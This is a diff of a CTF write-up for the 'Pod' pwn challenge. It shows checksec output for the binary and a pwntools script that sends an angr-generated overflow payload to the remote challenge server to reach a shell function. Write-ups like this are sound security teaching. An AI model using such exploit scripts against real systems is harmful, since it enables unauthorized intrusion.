@@ -1,4 +1,4 @@
-# POD
+# Pod
 
 ## Introduction
 we are given a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/polypwn2026/pod), which asks for a message and then repeats it:
@@ -97,7 +97,33 @@ ulong main(int argc,char **argv,char **envp)
     return 0;
 }
 ```
-We can then use angr to figure out how to exploit it:
-```python
-
+Let's check the binary's protections:
+```fish
+[I] ◆ ❯❯❯ pwn checksec pod
+[*] 'pod'
+    Arch:       amd64-64-little
+    RELRO:      No RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    FORTIFY:    Enabled
+    UBSAN:      Enabled
+    Stripped:   No
 ```
+There is no PIE, no stack canary and the `undercode.cfi` function to give us a shell.I then used angr to determine an input that will
+call `undercode.cfi`,and since there is no randomization,the input will work against the remote: 
+The final script was the following:
+
+```python
+from pwn import *
+context.terminal = ['alacritty','-e']
+#target = process("./pod.bck")
+target = remote('polypwn.polycyber.io',30196)
+
+# The input angr gave me. 
+payload = b'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\rC\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\xe8\rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x0bC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+
+target.send(payload)
+target.interactive()
+```
+That was easy.
